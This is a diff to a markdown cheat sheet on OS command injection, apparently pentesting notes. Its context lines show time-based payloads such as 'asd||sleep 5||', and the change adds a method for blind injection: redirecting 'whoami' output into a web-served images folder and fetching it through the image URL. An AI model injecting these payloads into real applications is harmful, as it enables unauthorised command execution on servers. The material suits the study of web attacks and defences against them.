@@ -37,12 +37,12 @@ asd||sleep 5|| >> Middle of two parameter.
 asd||sleep 5 # >> Last parameter or to comment out extra parameter
 ```
 ## Blind injection with output redirection
-
+If you identify a blind Command Injection try to find a writable folder to read your output. Suppose, if a application serves it's images for the product catalog from location like ```/image?filename=22.jpg```, you can redirect the output from the injected command to a file in this ```images``` folder, and then use this URL to retrieve the contents of the file.
 ```sql
-& whoami > /var/www/static/output.txt #
-
-; whoami > /var/www/static/output.txt ;
+& whoami > /var/www/images/output.txt #
+; whoami > /var/www/images/output.txt ;
 ```
+Now, you can read content like this ```/image?filename=output.txt```
 
 ## Out of band
 ```sh
